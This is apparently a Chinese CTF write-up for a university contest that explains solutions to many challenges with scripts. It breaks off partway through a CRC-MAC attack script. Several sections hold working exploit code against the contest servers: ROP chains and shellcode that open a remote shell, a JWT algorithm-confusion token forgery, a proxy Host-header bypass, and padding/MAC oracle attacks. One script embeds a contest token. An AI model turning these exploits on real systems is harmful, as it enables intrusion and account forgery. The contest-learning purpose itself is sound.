# Writeup

## 签到

直接审查元素然后修改 value 为 1

## 猫咪问答++

第 2 3 5 问都可以搜索引擎搜到，第 1 4 问都可以脚本枚举。

吐槽下第 4 问，我用 Google 卫星看的是 10 个车停在那里，而答案是 9 个。立刻举报！

## 2048

![js](https://konanoo-typora.oss-cn-beijing.aliyuncs.com/image-20201109002232015.png)

审查元素可知获取 flag 的方法。这里恶趣味地用了 `flxg`，我在搜索 flag 的时候就没搜到……

## 一闪而过的 Flag

运行的时候截图就行了

## 从零开始的记账工具人

有个 js 库叫做 `nzh`。

哦它没提供中文金额转数字，那就拿它的大写数字转阿拉伯数字功能吧！手动分割元、角、分然后丢给 `nzh` 算就行了。

## 超简单的世界模拟器

第一问直接输入一个横向走的滑翔机就行了。

第二问直接 fuzzing，或者找个能造成爆炸局面的初始局面就好了。

以及生命游戏有个 Wiki 来着。

```python
import numpy as np
import random, time

m = None
def init():
    global m
    m = np.zeros((50, 50), dtype=int)
    for i in range(5, 7):
        for j in range(45, 47):
            m[i][j] = 1
    for i in range(25, 27):
        for j in range(45, 47):
            m[i][j] = 1
init()

def check():
    for i in range(5, 7):
        for j in range(45, 47):
            if m[i][j] == 1:
                return True
    for i in range(25, 27):
        for j in range(45, 47):
            if m[i][j] == 1:
                return True
    return False

def print_map(m, sz):
    for i in range(sz):
        for j in range(sz):
            print(m[i][j], end='')
        print()
    print()

def run():
    global m
    _m = np.zeros((50, 50), dtype=int)
    for i in range(50):
        for j in range(50):
            alive = 0
            alive += m[i-1][j-1] if i>0 and j>0 else 0
            alive += m[i][j-1] if j>0 else 0
            alive += m[i+1][j-1] if i<49 and j>0 else 0
            alive += m[i-1][j] if i>0 else 0
            alive += m[i+1][j] if i<49 else 0
            alive += m[i-1][j+1] if i>0 and j<49 else 0
            alive += m[i][j+1] if j<49 else 0
            alive += m[i+1][j+1] if i<49 and j<49 else 0
            if m[i][j] == 1 and (alive < 2 or alive > 3):
                _m[i][j] = 0
            elif m[i][j] == 0 and alive == 3:
                _m[i][j] = 1
            else:
                _m[i][j] = m[i][j]
    m = _m

_m = np.zeros((15, 15), dtype=int)
while check():
    init()
    print('random...')
    for i in range(15):
        for j in range(15):
            _m[i][j] = m[i][j] = random.randint(0, 1)
    for _ in range(200):
        run()

print_map(_m, 15)
```

## 从零开始的火星文生活

首先既然是编码错误，那百度肯定能百度到类似的错误。只要找到原文和乱码的对应关系，就能知道编码错误的产生原理了。

我找的网站是 [这个](http://www.wellxin.com/news_mono_item.php?id=4155)，然后我利用文章发布日期的「年、月、日」所对应的乱码，将他们的 GBK 码以十六进制列出来，就能看出编码错误的规律了。具体规律可以看代码：

```python
with open('gbk_message.txt', 'rb') as f:
    s = f.read()

o = open('gbk_origin.txt', 'wb')

for i in range(len(s)):
    if s[i] == 195:
        o.write((s[i+1]^64).to_bytes(1,'little'))
    elif s[i] == 194:
        o.write(s[i+1].to_bytes(1,'little'))
    elif i > 0 and s[i-1] != 195 and s[i-1] != 194:
        o.write(s[i].to_bytes(1,'little'))
```

## 自复读的复读机

```python
x='x=%r;print((x%%x),end="")';print((x%x),end="")
```

稍微变形下就行了。

```python
x='x=%r;print((x%%x)[::-1],end="")';print((x%x)[::-1],end="")
```

同样的，为了输出 sha256，也是需要做点变形的。

```python
import hashlib;x='import hashlib;x=%r;print(hashlib.sha256(str.encode(x%%x)).hexdigest(),end="")';print(hashlib.sha256(str.encode(x%x)).hexdigest(),end="")
```

你会发现框架其实都差不多。

## 233 同学的字符串工具

很高兴能拿到这题的首杀。

第一问，可以预想的是，upper 会输出一些奇怪的字符，这可以通过遍历 1-128 的字符并丢给 upper 做运算得到验证。接着遍历 1-65536，找出那个特殊的字符。

```python
g = ['F', 'L', 'A', 'G', 'FL', 'LA', 'AG']

for i in range(256*256):
    for x in g:
        if chr(i).upper() == x:
            print(x, i, chr(i))
```

第二问，通过搜索可知 UTF-7 有个比较特殊的构造，把 `FLAG` 的某一个字符用 UTF-7 构造法构造一下就可以了。

## 233 同学的 Docker

可以从 [这里](https://hub.docker.com/layers/8b8d3c8324c7/stringtool/latest/images/sha256-aef87a00ad7a4e240e4b475ea265d3818c694034c26ec227d8d4f445f3d93152?context=explore) 看到 flag.txt 在 code 文件夹内而且在创建的时候就被删除了。拉取仓库后保存到本地，然后就可以 docker save 存成一个 tar 然后在里面找 flag.txt。

## 从零开始的 HTTP 链接

首先 `curl http://202.38.93.111:0`  可以获得 HTML 源码。（Windows 的 WSL 失败，Linux 服务器成功）可知和其他获取 flag 的页面一样，都开了个 websocket。

然后 `websocat ws://202.38.93.111:0/shell` 就好了。

难点在于使用各种工具验证是否能访问 0 号端口……

`wscat` 可以访问，但是它不能发送回车！

## 来自一教的图片

图片隐写之傅里叶变换。

## 超简陋的 OpenGL 小程序

修改了下视角：

```C++
gl_Position = vec4(gl_Position.x+1, gl_Position.y, -gl_Position.z, gl_Position.w);
```

![Flag](https://konanoo-typora.oss-cn-beijing.aliyuncs.com/flag.png)

请了学 OpenGL 的室友来帮忙，然而他也不太会……

## 生活在博弈树上

第一问，gets 函数？一看就是栈溢出！win 还是局部变量！直接覆盖掉就好了 w

第二问，观察到开了 NX 保护，所以要找点 gadget。至于 `\bin\sh` 就再调用 gets 写到 bss 段就好了。

```python
from pwn import *

context.log_level = 'debug'
local = False

if local:
    r = process('./tictactoe')
else:
    r = remote('202.38.93.111', 10141)
    r.sendlineafter('Please input your token:', '')
e = ELF('./tictactoe')

pop_rax_ret = 0x0043e52c
pop_rbx_ret = 0x0040274b
pop_rdx_ret = 0x0043dbb5
main_addr   = 0x004022F4
binsh_addr  = 0X004A8AD0
system_call = 0x00402bf4
pop_rdi_ret = 0x004017b6
pop_rsi_ret = 0x00407228
get_addr    = e.symbols['gets']

rop = [pop_rdi_ret, binsh_addr, get_addr, pop_rax_ret, 0x3b, pop_rdi_ret, binsh_addr, pop_rsi_ret, 0, pop_rdx_ret, 0, system_call]
payload = flat(['(1,1)', '\01'*(152-5), b''.join(list(map(p64, rop)))])

r.sendlineafter('such as (0,1):', payload)
r.recvuntil('Here is your flag:')
r.sendline('/bin/sh')
r.interactive()
```

写题解的时候突然意识到……为啥不直接 gets 然后把 shellcode 写到代码段就好了……不是更容易了吗？我蠢。

以及上次写 pwn 已经是一年前的事情了，这次算是重新捡起来了。我都忘了 `rsp` 是栈顶这种常识了。

## 来自未来的信笺

一看就是模仿 GitHub Archive Program，所以我直接去找了该 Program 有没有提供解压的代码，但可惜的是并没有知道。所以尝试直接解二维码再说。

但本题的难点来了：各大工具都不支持 decode 包含 0x00 的二进制数据，这也是为什么第一个二维码会只读出 `META` 的原因。Ubuntu 安装 `zbarimg==0.2.3` 还各种编译失败，用了老版本的 `gtk` 可还行，但 Mac 就编译并安装成功了。

总之到最后就是组合成 .tar.gz 文件然后就解压解压就能看到 flag 了。

## 狗狗银行

每个储蓄卡放 167 块钱，信用卡贷款 2099 块钱，就可以最大限度薅羊毛啦！四舍五入真的不行（摇头

```python
import requests, json

url = 'http://202.38.93.111:10100/api/'
cookies = {'session':''}
headers = {'Content-Type': 'application/json;charset=UTF-8', 'Authorization': 'Bearer'}

card = [1]
money = 1000

def create_debit():
    global card
    card += [1]
    ret = requests.post(url+'create', cookies=cookies, data=json.dumps({'type':'debit'}), headers=headers, timeout=(5,10))
    assert ret.status_code == 200

def create_credit():
    global card
    card += [2]
    ret = requests.post(url+'create', cookies=cookies, data=json.dumps({'type':'credit'}), headers=headers, timeout=(5,10))
    assert ret.status_code == 200

def transfer(src, dst, amount):
    ret = requests.post(url+'transfer', cookies=cookies, data=json.dumps({'src':src,'dst':dst,'amount':amount}), headers=headers, timeout=(5,10))
    assert ret.status_code == 200

def eat():
    ret = requests.post(url+'eat', cookies=cookies, data=json.dumps({'account':1}), headers=headers, timeout=(5,10))
    assert ret.status_code == 200

for _ in range(70):
    create_credit()
    transfer(len(card), 1, 2099)
    money += 2099

while money - 167 >= 167:
    create_debit()
    transfer(1, len(card), 167)
    money -= 167

for _ in range(10):
    eat()
    print('Eat:', _+1)
    for i in range(len(card), 1, -1):
        if card[i-1] == 1:
            transfer(i, 1, 1)
        else:
            transfer(1, i, 10)
```

## 超基础的数理模拟器

找了个库 `sympy` 然后写了个脚本来跑，但这个库是真的慢，所以把多个积分拆成多个来算。以及有种方法叫做挑软柿子捏。

```python
from sympy import *
from sympy.parsing.latex import parse_latex

x = Symbol('x')
e = E

import requests
import http.cookiejar as HC
import re, json, random

def cal(expr):
    try:
        expr = expr.replace(r'\,', '').replace(r'\left', '').replace(r'\right', '').replace(r'{d x}', 'dx')
        # print(expr)
        expr = parse_latex(expr)
        expr = str(expr)
        # print(expr)

        expr = expr[9:-1]
        suf = '(x, ' + expr.split(', (x, ')[1]
        expr = expr.split(', (x, ')[0]
        # print(expr)
        # print(suf)

        expr = expr.replace(' - ', ' + -1*')
        exprs = []
        now = ''
        for _ in expr.split(' + '):
            now = (now + '+' + _) if now != '' else _
            if now.count('(') == now.count(')'):
                # assert len(now) <= 30
                assert now.count('atan') == 0
                assert now.count('e**') == 0
                assert now.count('(') < 3
                exprs += [now]
                now = ''
        assert now == ''

        sum = 0
        for _ in exprs:
            expr = f'integrate({_}, {suf})'
            print(expr)
            value = float(eval(expr))
            print(value)
            sum += value
        return sum
    except:
        print('ERROR')

session = requests.session()
session.cookies = HC.LWPCookieJar(filename='cookies')
try:
    session.cookies.load(ignore_discard=True)
except:
    pass

r = session.get('http://202.38.93.111:10190/')
# print(r.text)
session.cookies.save(ignore_discard=True)
assert r.status_code == 200
remain = int(re.findall(r'(?<=<h1 class="cover-heading"> )\d*(?= 题)', r.text)[0])

while remain > 0:
    print('Remain:', remain)
    ret = cal(re.findall(r'(?<=<p> \$).*(?=\$)', r.text)[0])
    if ret != None:
        r = session.post('http://202.38.93.111:10190/submit', data={'ans': ret})
        # print(r.text)
    else:
        r = session.get('http://202.38.93.111:10190/')
    session.cookies.save(ignore_discard=True)
    assert r.status_code == 200
    remain = int(re.findall(r'(?<=<h1 class="cover-heading"> )\d*(?= 题)', r.text)[0])

session.cookies.save(ignore_discard=True)
```

## 永不溢出的计算器

从 `0-1` 可以知道 `n-1` 的值，然后要好好利用 `sqrt` 去分解 n。分解的方法为 $a^2\equiv b^2 \pmod{n}$，也就是我们要找一组 $a,b$ 使得 $a^2b^2 \equiv (ab)^2 \pmod{n}$。然后容易得到 $a^2-b^2\equiv 0\pmod n$ 既 $n \vert (a-b)(a+b)$。由于 n 是由两个大质数相乘得到的，则两个质数必然一个整除 $a-b$ 一个整除 $a+b$。一组不够就多来几组，然后求 gcd 即可。

```python
from gmpy2 import *
from random import randint

n = 23950395473563299108052311724257430551663245428267787729488605241570117624985334261073843773211894216492035928849917231133041402216732333235213366704485232544115313279975923891457463383576725812608145423635606232517980242073622636772676517796204059205743598545016353682740542570855087936068117588634006945801
c = 10344599140324155509135718247889559814893870905684804681444559600279329873054018210638438184080145484662270556764226824316939155916185164447284710505209772296800751005642805005660391598100596805834478069826122463909974639502959469697762995814781885180832164345863718082959960915742788054713647807537640476920
e = 65537

# sqrt(5) sqrt(6)
a0 = 3336146743236199382745750887200909327298906376460410963346056607022892826108367056023686110759212602658307471920989177549038203895778856724901211592989882760806882051092304178364075426850581026404398707054242122791044354082359949862352611279527774692426659003902750951663833410127201892643231438607198511449
b0 = 14501700319488560685494057437079377544937003217592904315983316573515454777985577724277643454199623762699885939642423936086459927090677241717830124273906408668670524322124695712287657232819640597568971003488623991823470149521370157642164028101713936298130140383107905817436220956244640739428241415642126915889
if a0 < b0:
    a0, b0 = b0, a0
# sqrt(6) sqrt(14)
a1 = 5842458554051416516887716083895845918502126476903827147628702012348878785421992769060039285464325365053249815165361964962411272200691413930690416497200989090418718147702074652375727240344971355864880107758481444557648608835954200950549714169220375210375242728831831922367965116214338534891635573807948360617
b1 = 3360884698154736093562864204981886226134229848164481142881627058849385593811101470440647498204134400008807706977467517904175930408095158260439567140681978511946506601206786156314743566471037505670579976571020450941652237037272086522713195546367307885425556524880329279300489550572565359380919490314205010392
if a1 < b1:
    a1, b1 = b1, a1
p = gcd(a0 - b0, a1 + b1)
q = gcd(a0 + b0, a1 - b1)
print(p * q == n)
d = invert(e, (p-1) * (q-1))
m = int(pow(c, d, n))
print(m.to_bytes(128, 'big').strip(b'\x00'))
```

## 普通的身份认证器

jwt 简单题。一般 jwt 对待 RS256 加密算法也就只有改成用公钥改成 HS256 算法这一种途径了。

网站框架是 Vue，我们在访问 `\debug` 的时候意外发现返回的不是 `{"detail":"Not Found"}` 而是 `{"detail":"Method Not Allowed"}`，那就换成 POST 呀！不出意外，服务器返回了一点有用的东西，一看是个公钥！接下来也就顺理成章了。

哦对了，记得使用 jwt=0.3.0，但用最新的版本也可以，只是需要手动去除报错代码。

操作上，将 POST 得到的公钥一个字节不差地全部喂给 jwt，正常版本会报错，但老的版本并不会，或者可以手动删除判断代码。得到的 jwt 便可以啦~

哦对，exp 记得更新……

```python
import jwt
public = open('public.pem', 'rb').read()
token = jwt.encode({"sub":"admin","exp":1604496548}, algorithm='HS256', key=public).decode(encoding='utf-8')
print(token)
```

## 超精巧的数字论证器

`-~` 加一`~-`减一（一个取反一个负数补码）然后随机构造一些有趣的论证，最后没论证到的数字直接从附近论证成功的数字前面加上前面加减一的操作就好了。

## 超自动的开箱模拟器

按照循环节的顺序来猜的话，假如最长的循环节不超过 64，那么就成功了！

BrainFucker 代码挺好写的，手机也可以做 CTF 了！

最短的 BrainFucker 代码，长度 27，用了两个数据位：`+[+>,-[<.>-]<+.-->-[<.>-]<]`

（实际上这是 mcfx 想出来的，我自己想到的是长度 30 用了三个数据位的方法。）

## 超简易的网盘服务器

首先由 `Dockerfile` 可知主目录还有一个 h5ai，其次观察 nginx 的配置文件会发现 php 优先级较高，于是我们可以访问 `/_h5ai/public/index.php` 搞事。调用 download 的 api，把 flag.txt 给下载下来即可。

## 超安全的代理服务器

第一问，首先抓包 HTTP2 看到 Secret 和 Flag（学会了 Wireshark 抓包 TLS 的姿势），然后花了好大的功夫写出了代码，用 hyper 发 HTTP2 包。

第二问，HTTP2 的 CONNECT 包发了好久始终没用，后来发现 HTTP1.1 也可以……那么问题在于怎么绕过，这里采用了 `0.0.0.0` 绕过法，感觉特别简单（

最后还得附上一个 Referer 才能成功访问。

```python
from hyper import HTTPConnection, HTTP11Connection

from hyper import tls
import ssl, re
import sslkeylog, os, time, urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# sslkeylog.set_keylog('key.log')

ssl_context = tls.init_context()
ssl_context.check_hostname = False
ssl_context.verify_mode = ssl.CERT_NONE

conn = HTTPConnection('146.56.228.227:443', ssl_context=ssl_context, enable_push=True)

conn.request('GET', '/')
resp = conn.get_response()
for push in conn.get_pushes():
    text = push.get_response().read()
    flag = re.findall(rb'(?<= proxy\.\().*(?= \)\<)', text)[0]
    secret = re.findall(rb'(?<=secret: ).*(?= ! Pl)', text)[0]

print(flag)

import requests

s = requests.Session()
r = s.request('CONNECT', 'https://146.56.228.227:443', headers={'Secret': str(secret, encoding='utf-8'), 'Host': '0.0.0.0:8080'}, verify=False)
r = s.request('GET', 'https://146.56.228.227:443', headers={'Host': '127.0.0.1:8080', 'Referer': '146.56.228.227'}, verify=False)
# print(r.status_code)
print(r.text)
```

## 证验码

首先可以发现打乱图像并不会影响像素颜色的分布，以及每个字在图上的大小和像素颜色分布都是固定的，随机的只有 noise 的位置和颜色。先跑一遍没有 noise 的图，统计出每个字在图上的像素颜色分布，然后剩余的就是枚举可能的组合，并将组合内的字符的像素颜色分布加在一起，和打乱后的像素颜色分布相比对，选出最接近的。

这里其实可以采用最简单的模拟退火算法。首先由于 noise 的存在，无 noise 的图像的颜色像素分布的每一个数值的颜色数量都会比有 noise 的图像的分布要多，所以可以这样设置一个函数：

$$
F(N,G)=\sum_{i=0}^{255}\left(\max(0,N_i-G_i)^2\times 10000+\max(0,G_i-N_i)\right)
$$

其中 $N_i$ 表示有 noise 的图像中像素 `(i,i,i)` 的数量，$G_i$ 表示无 noise 的图像中像素 `(i,i,i)` 的数量。

接着我们就是要让 F 最小，这里就可以使用模拟退火来算了。

```python
import numpy as np
from PIL import ImageFont, ImageDraw, Image
from matplotlib import pyplot as plt
import pathlib
import requests

import string
from random import SystemRandom
random = SystemRandom()

alphabet = sorted(string.digits + string.ascii_letters)

def img_generate(text):
    img = Image.new('RGB', (40 * len(text), 100), (255, 255, 255))
    # https://github.com/adobe-fonts/source-code-pro/raw/release/TTF/SourceCodePro-Light.ttf
    fontpath = pathlib.Path(__file__).parent.absolute().joinpath("SourceCodePro-Light.ttf")
    font = ImageFont.truetype(str(fontpath), 64)
    draw = ImageDraw.Draw(img)
    draw.text((0, 0), text, font = font, fill = (0,0,0,0))
    return img


def add_noise(draw, size):
    def get_random_xy(draw):
        x = random.randint(0, size[0])
        y = random.randint(0, size[1])
        return x, y
    
    def get_random_color():
        r = random.randint(0, 256)
        g = random.randint(0, 256)
        b = random.randint(0, 256)
        return r, g, b
    
    draw.line([get_random_xy(draw), get_random_xy(draw)], 
                get_random_color(), width=1)


def shuffle(img):
    pix = np.array(img)
    x, y, z = pix.shape
    t = pix.reshape(-1, z).tolist()
    random.shuffle(t)
    pix_shuffled = np.array(t, dtype=np.uint8).reshape(x, y, z)
    return Image.fromarray(pix_shuffled)


def generate_captcha(code, noise=0, shuffle_mode=False):
    img = img_generate(code)
    draw = ImageDraw.Draw(img)
    for _ in range(noise):
        add_noise(draw, size=img.size)

    if shuffle_mode:
        return shuffle(img)
    else:
        return img

def get_feature(pic):
    feature = np.zeros(256, dtype=int)
    pix = np.array(pic)
    for x in pix.reshape(-1, pix.shape[2]).tolist():
        if (x[0], x[1]) == (x[1], x[2]):
            feature[x[0]] += 1
    return feature

feature = np.zeros((len(alphabet), 256), dtype=int)
for idx, ch in enumerate(alphabet):
    feature[idx] = get_feature(generate_captcha(ch))

# f_o = get_feature(Image.open('captcha.bmp'))
# print(f_o)

# f_s = get_feature(Image.open('captcha_shuffled.bmp'))
# print(f_s)

# code = 'Hu69Jj8TOyKcibkB'
# code = ''.join([random.choice(alphabet) for _ in range(16)])
# f = get_feature(generate_captcha(code))
# print(f)

# f_t = np.zeros(256, dtype=int)
# for ch in code:
#     f_t += feature[alphabet.index(ch)]
# print(f_t)
# print(f_t - f)
# print(code)
# print(f - f_o)
# print(f_t - f_s)

cookies = {'session':''}

f_o = get_feature(Image.open('captcha_shuffled.bmp'))
print(f_o)

def score(code):
    f = f_o.copy()
    for ch in code:
        f -= feature[alphabet.index(ch)]
    return np.sum(np.power(np.maximum(f, 0), 2)) * 10000 - np.sum(np.minimum(f, 0))

best = ''.join([random.choice(alphabet) for _ in range(16)])
best_score = score(best)
# print(best, best_score)

for i in range(2, 0, -1):
    for _ in range(10000):
        new = ''.join(random.sample(best, 16-i)) + ''.join([random.choice(alphabet) for _ in range(i)])
        new_score = score(new)
        if new_score < best_score:
            best, best_score = new, new_score
    print(best, best_score)

print('=' * 25)

for i in range(16):
    for ch in alphabet:
        if best[i] != ch:
            new = best[:i] + ch + best[i:]
            new_score = score(new)
            if new_score < 10000:
                print(new, new_score)

param = '&'.join([f'r_{c}={best.count(c)}' for c in alphabet])
r = requests.get(f'http://202.38.93.111:10150/result?{param}', cookies=cookies)
print(r.text)
```

## 超精准的宇宙射线模拟器

一般来说，这种题的套路就是先劫持控制流，获得无限次翻转的机会，然后就可以为所欲为了。

首先观察代码，发现可以修改 0x401296 上的第 4 个 bit，将原本 `call sub_4010C0` 修改成 `call _start`（两个函数的起始地址只有一个比特相差）这样就先做到无限次翻转的可能了。

然后剩余的很简单了，找个空位置把 shellcode 写进去，然后修改下 `loc_40129A` 的起始指令为 `call`，目标为 shellcode 的位置，接着输入 `0 9` 让其在判断非法输入后跳到 `loc_40129A` 并接着跳到 shellcode，完成！

```python
from pwn import *

context.log_level = 'debug'
local = False

shellcode = b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'

if local:
    r = process('./bitflip')
else:
    r = remote('202.38.93.111', 10231)
    r.sendlineafter('Please input your token:', '576:MEYCIQCGcfReykZRJavQ7Frn38feV8te705pgRy7p/xNdBryjQIhAP6zs4eY+t99jVm9uoIBFsufzIHU7jyjw8ilJ8xFufbx')
e = ELF('./bitflip')


def change(addr, idx):
    r.sendlineafter('Where do you want to flip?', f"{hex(addr).replace('0x','')} {idx}")

def changes(addr, data):
    ram = e.read(addr, len(data))
    for i in range(len(data)):
        diff = ram[i] ^ data[i]
        for j in range(8):
            if diff & (1 << j) != 0:
                change(addr + i, j)

change(0x401296, 4)
changes(0x401400, shellcode)
changes(0x40129a, b'\xe8\x61\x01\x00\x00') # 129f
change(0x401296, 9)
r.interactive()
```

## 超迷你的挖矿模拟器

首先注意到挖取过程是有个 3 秒的短暂停顿的，而这停顿两边各有一次判断当前位置属性的操作，那么可以确定的是我们要做到在第一次判断的时候该位置不是 FLAG，经过停顿之后在第二次判断该位置有 FLAG。

经过观察，地图上 `(1,1)` 始终有 FLAG，那我们可以先把 FLAG 挖掉，此时该位置为空气，然后我们再挖第二次（发包），此时挖的是空气，通过了第一层判断，然后在等待期间发送 `reset`，这样在第二次判断的时候该位置就是 FLAG 了。

## 中间人

第一问，思路是充分利用 Bob 的检验功能，也就是我们在伪造明文的时候怎么样才能让 Bob 也检验通过，既同时通过 AES 和 检验码 两重检查。

SHA256 我们也能算，但问题在于其明文和密文的对应关系我们并不知道，所以需要借助无穷长的 extra，将其丢给 Alice，然后截取我们那段明文所对应的的密文，并将上一块的密文作为 IV，这样就解决了 AES 解密的问题。

那要怎么求 flag 呢？可以采取从后往前一个个猜的方式。我们丢给 Alice 的时候 extra 等于若干个 `\x00`，并控制 name 和 extra 的长度，让 extra 和 flag 的带猜字符加上已知的后缀连起来刚好能占用几个完整的块，而我们要计算的 SHA256 也是这一串字符的 SHA256。将其丢给 Alice，并截取我们要的密文， 丢给 Bob，此时 AES 是能通过的，但若 Bob 返回错误，则必然是 SHA256 计算错误，也就是带猜字符和我们猜测的不一致。这样重复进行就可以依次猜出所有 FLAG 的字符了。

```python
#!/usr/bin/env python3

from Crypto.Cipher import AES
import os
from hashlib import sha256
from utils import *
from pwn import *

interactive = True
flag = open("flag1").read().encode()
AES_key = os.urandom(16)
printable = bytes(string.printable, encoding='utf-8')
print(printable)

if interactive:
    conn = remote('202.38.93.111', 10041)
    # context.log_level = 'debug'
    conn.recvuntil('Please input your token: ')
    conn.sendline('')
    conn.recvuntil('Which level do you want to play (1/2/3)? ')
    conn.sendline('1')
    conn.recvuntil('Whom do you want to talk to? ')

def talk_to_Alice(name, extra):
    if interactive:
        conn.sendline('Alice')
        conn.recvuntil('What\'s your name? ')
        conn.sendline(name)
        conn.recvuntil('What else do you want to say? ')
        conn.sendline(extra)
        conn.recvuntil(b'This is my encrypted message, please take it to Bob:\n')
        ret = str(conn.recvline().strip(), encoding='utf-8')
        conn.recvuntil('Whom do you want to talk to? ')
        return ret
    name = bytes.fromhex(name)
    extra = bytes.fromhex(extra)
    msg = b"Thanks " + name + b" for taking my flag: " + flag + extra
    plaintext = msg + sha256(msg).digest()
    iv = os.urandom(AES.block_size)
    aes = AES.new(AES_key, AES.MODE_CBC, iv)
    ret = (iv + aes.encrypt(pad(plaintext))).hex()
    return ret


def talk_to_Bob(ciphertext):
    if interactive:
        conn.sendline('Bob')
        conn.recvuntil('Show me your message from Alice: ')
        conn.sendline(ciphertext)
        ret = conn.recvline().strip()
        conn.recvuntil('Whom do you want to talk to? ')
        if ret == b'Thanks':
            return True
        elif ret == b'What\'s your problem???':
            return False
        raise Exception
    try:
        # ciphertext = str(ciphertext, encoding='utf-8')
        ciphertext = bytes.fromhex(ciphertext)
        iv = ciphertext[: AES.block_size]
        aes = AES.new(AES_key, AES.MODE_CBC, iv)
        plaintext = aes.decrypt(ciphertext[AES.block_size :])
        plaintext = unpad(plaintext)
        assert sha256(plaintext[:-32]).digest() == plaintext[-32:]
        return True
    except:
        return False


def get_flag_len():
    pre = len(talk_to_Alice('00', '00')) // 2 - 16
    for i in range(2, 100):
        now = len(talk_to_Alice('00' * i, '00')) // 2 - 16
        if pre != now:
            return now - 16 - 32 -28 - i - 1

fg_len = get_flag_len()
fg = b''
for o in range(fg_len):
    name_len = 1
    while (28 + name_len + fg_len) % 16 != (o + 1) % 16:
        name_len += 1
    extra_len = 0
    while (28 + name_len + fg_len + extra_len) % 16 != 0:
        extra_len += 1
    block = (28 + name_len + fg_len + extra_len) // 16
    ck = False
    for ch in printable:
        p = ('%02x' % ch) + fg.hex() + '00' * extra_len
        h = sha256(bytes.fromhex(p)).digest().hex()
        c = talk_to_Alice('00' * name_len, '00' * extra_len + h + '10' * 16)
        if talk_to_Bob(c[32*(block-1-o//16): 32*(block+len(p+h)//32+1-o//16)]):
            ck = True
            fg = bytes([ch]) + fg
            break
    print(fg)
    assert ck == True
```

第二问是第三问的子集，所以我考虑直接解决第三问。

还是原来的思路，如何构造密文让 Bob 检验通过。这里使用到了 CRC 的性质，即若原文第 $x$ 个 bit 发生翻转，则翻转后的 CRC 等于原文的 CRC 异或上 $\text{CRC}(2^x)\oplus\text{CRC}(0)$。也就是说，我们实际上是可以一边修改原文一边修改 CRC 的。当然这对 HMAC_CRC 也是管用的。注意，这个等式只在文本长度固定的情况下才成立。

那么我们考虑翻转相邻两块密文，AES decode 仍可以工作，但解出来会有三块明文变成乱码。但别完了我们只是修改密文的顺序，那么实际上根据 CBC 的分组模式，我们可以知道修改顺序后明文的变化是什么，知道变化就知道哪些 bit 被翻转了，也知道 CRC 的变化。但我们不知道 CRC 的原值是多少，所以我们要做到抵消这种变化。只要抵消掉了，那么喂给 Bob 也就能通过检验了。

那么！同样是从后往前猜字符，我们也是一个个假设 FLAG 最后字符是什么，以及控制其和 extra 在一个或若干个完整的块内。我们目的是要交换 FLAG 最后字符所在的块和其后面的块的密文，因为基于猜测，我们知道明文，所以我们也知道其变化，以及会如何影响 CRC 值。

那么接着就是抵消其对 CRC 的影响了。我们可以给 extra 后面附加上 $128\times3$ 块全是 `\x00` 的明文块，这样我们就可以有 128 个交换方式，每种交换方式对 CRC 值的影响都是不同的，组合起来共有 $2^{128}$ 种方式，而 CRC 值也只有 128 个 bits，所以这时候可以通过计算线性基，求得要让 CRC 的具体某一位翻转而其他 bit 保持不动的选择组合方案。这样便可以做到抵消掉 CRC 的影响，让 CRC 保持不变。那这样的话，便可以使用第一问的方法，假设并检验，若通过了检验则表明猜测正确，最后从后往前一个个字符进行猜测。注意，组数 128 可能会不够，因为可能不是极大线性无关组，所以可以适当增加组数，实际操作上我选择了 139 组。

```python
#!/usr/bin/env python3

from Crypto.Cipher import AES
import os
from hashlib import sha256
from utils import *
from pwn import *
import pickle, random

interactive = True
flag = open("flag1").read().encode()
AES_key = os.urandom(16)
MAC_key = os.urandom(16)
MAC_key_myself = b'\xe4\xa4+jq\x0e{aV8vq\xcc\xd7h?'
printable = bytes(string.printable, encoding='utf-8')

def connect_remote():
    conn = remote('202.38.93.111', 10041)
    # context.log_level = 'debug'
    conn.recvuntil('Please input your token: ')
    conn.sendline('')
    conn.recvuntil('Which level do you want to play (1/2/3)? ')
    conn.sendline('3')
    conn.recvuntil('Whom do you want to talk to? ')
    # conn.interactive()
    return conn

if interactive:
    conn = connect_remote()

def talk_to_Alice(name, extra):
    if interactive:
        conn.sendline('Alice')
        conn.recvuntil('What\'s your name? ')
        conn.sendline(name)
        conn.recvuntil('What else do you want to say? ')
        conn.sendline(extra)
        conn.recvuntil(b'This is my encrypted message, please take it to Bob:\n')
        ret = str(conn.recvline().strip(), encoding='utf-8')
        conn.recvuntil('Whom do you want to talk to? ')
        return ret
    name = bytes.fromhex(name)
    extra = bytes.fromhex(extra)
    msg = b"Thanks " + name + b" for taking my flag: " + flag + extra
    plaintext = msg + hmac_crc128(MAC_key, msg)
    iv = os.urandom(AES.block_size)
    aes = AES.new(AES_key, AES.MODE_CBC, iv)
    ret = (iv + aes.encrypt(pad(plaintext))).hex()
    return ret


def talk_to_Bob(ciphertext):
    if interactive:
        conn.sendline('Bob')
        conn.recvuntil('Show me your message from Alice: ')
        conn.sendline(ciphertext)
        ret = conn.recvline().strip()
        conn.recvuntil('Whom do you want to talk to? ')
        if ret == b'Thanks':
            return True
        elif ret == b'What\'s your problem???':
            return False
        raise Exception
    try:
        ciphertext = bytes.fromhex(ciphertext)
        iv = ciphertext[: AES.block_size]
        aes = AES.new(AES_key, AES.MODE_CBC, iv)
        plaintext = aes.decrypt(ciphertext[AES.block_size :])
        plaintext = unpad(plaintext)
        assert hmac_crc128(MAC_key, plaintext[:-16]) == plaintext[-16:]
        return True
    except:
        return False

def get_flag_len():
    pre = len(talk_to_Alice('00', '00')) // 2 - 16
    for i in range(2, 100):
        now = len(talk_to_Alice('00' * i, '00')) // 2 - 16
        if pre != now:
            return now - 16 - 16 - 28 - i - 1

fg_len = get_flag_len()
print('flag_len:', fg_len)
block = 139
offset = 0
p_len = 28 + fg_len * 3 + (3 + 3 * block) * 16
while p_len % 16 != 0:
    p_len += 1
    offset += 1

def hmac_crc(x):
    return hmac_crc128(MAC_key_myself, x)

# base = b'\x00' * p_len
# base_h = hmac_crc128(MAC_key_myself, base)
# flip = [''] * (p_len * 8)
# for o in range(p_len):
#     print(o)
#     for i in range(8):
#         x_h = hmac_crc128(MAC_key_myself, base[:o] + (1<<i).to_bytes(1,'big') + base[o+1:])
#         flip[o * 8 + i] = xor(x_h, base_h)
# with open('predata.dat', 'wb') as f:
#     pickle.dump(flip, f)

